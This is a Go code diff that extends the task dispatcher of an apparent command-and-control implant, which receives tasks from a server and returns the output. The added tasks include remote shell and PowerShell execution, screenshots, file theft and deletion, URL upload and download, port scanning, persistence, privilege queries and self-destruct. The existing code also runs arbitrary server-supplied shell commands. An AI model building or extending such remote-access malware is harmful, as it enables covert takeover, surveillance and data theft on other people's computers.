@@ -14,7 +14,7 @@ import (
 )
 
 // MaxOutputSize limits the output size sent back to the server
-const MaxOutputSize = 64 * 1024 // 64KB
+const MaxOutputSize = 1024 * 1024 // 1MB
 
 // Execute handles task execution based on type
 func Execute(task *comms.TaskPayload) *comms.ResultRequest {
@@ -23,32 +23,78 @@ func Execute(task *comms.TaskPayload) *comms.ResultRequest {
 		Status: "success",
 	}
 
+	var output string
+	var err error
+
 	switch task.Type {
 	case "system_info":
-		result.Output = collectSystemInfo()
+		output = collectSystemInfo()
 	case "execute_command":
-		output, err := executeCommand(task.Payload)
-		if err != nil {
-			result.Output = output
-			result.Error = err.Error()
-			result.Status = "error"
-		} else {
-			result.Output = output
-		}
-	case "upload_result":
-		output, err := readFile(task.Payload)
-		if err != nil {
-			result.Error = err.Error()
-			result.Status = "error"
-		} else {
-			result.Output = output
-		}
+		output, err = executeCommand(task.Payload)
+	case "ps":
+		output, err = listProcesses()
+	case "ps_json":
+		output, err = listProcessesJSON()
+	case "kill":
+		output, err = killProcess(task.Payload)
+	case "screenshot":
+		output, err = captureScreenshot()
+	case "ls":
+		output, err = listDirectory(task.Payload)
+	case "ls_json":
+		output, err = listDirectoryJSON(task.Payload)
+	case "cd":
+		output, err = changeDirectory(task.Payload)
+	case "pwd":
+		output, err = printWorkingDirectory()
+	case "mkdir":
+		output, err = makeDirectory(task.Payload)
+	case "rm":
+		output, err = deleteFileFromDisk(task.Payload)
+	case "cp":
+		output, err = copyFile(task.Payload)
+	case "mv":
+		output, err = moveFile(task.Payload)
+	case "cat":
+		output, err = readFile(task.Payload)
+	case "download":
+		output, err = readFile(task.Payload)
+	case "upload":
+		output, err = writeFileToDisk(task.Payload)
+	case "download_url":
+		output, err = downloadFromUrl(task.Payload)
+	case "upload_url":
+		output, err = uploadToUrl(task.Payload)
+	case "netstat":
+		output, err = getNetworkInfo(task.Payload)
+	case "netstat_json":
+		output, err = getNetworkInfoJSON(task.Payload)
+	case "portscan":
+		output, err = portScan(task.Payload)
+	case "persist":
+		output, err = addPersistence(task.Payload)
+	case "unpersist":
+		output, err = removePersistence(task.Payload)
+	case "self_destruct":
+		output, err = selfDestruct()
+	case "getprivs":
+		output, err = getPrivileges()
+	case "getenv":
+		output, err = getEnvironment()
+	case "powershell":
+		output, err = executePowerShell(task.Payload)
 	case "sleep_update":
-		// Handled in beacon loop, just acknowledge
-		result.Output = "sleep interval updated"
+		output = "sleep interval updated"
 	default:
-		result.Error = fmt.Sprintf("unknown task type: %s", task.Type)
+		err = fmt.Errorf("unknown task type: %s", task.Type)
+	}
+
+	if err != nil {
+		result.Output = output
+		result.Error = err.Error()
 		result.Status = "error"
+	} else {
+		result.Output = output
 	}
 
 	// Truncate output if too large
@@ -76,7 +122,8 @@ func collectSystemInfo() string {
 	}
 
 	// Try to get additional system info
-	if runtime.GOOS == "linux" {
+	switch runtime.GOOS {
+	case "linux":
 		if out, err := exec.Command("uname", "-a").Output(); err == nil {
 			data["uname"] = strings.TrimSpace(string(out))
 		}
@@ -86,7 +133,7 @@ func collectSystemInfo() string {
 		if out, err := exec.Command("id").Output(); err == nil {
 			data["id"] = strings.TrimSpace(string(out))
 		}
-	} else if runtime.GOOS == "windows" {
+	case "windows":
 		if out, err := exec.Command("whoami").Output(); err == nil {
 			data["user"] = strings.TrimSpace(string(out))
 		}
@@ -110,9 +157,10 @@ func executeCommand(payload interface{}) (string, error) {
 	}
 
 	var cmd *exec.Cmd
-	if runtime.GOOS == "windows" {
+	switch runtime.GOOS {
+	case "windows":
 		cmd = exec.Command("cmd", "/C", cmdStr)
-	} else {
+	default:
 		cmd = exec.Command("/bin/sh", "-c", cmdStr)
 	}
 
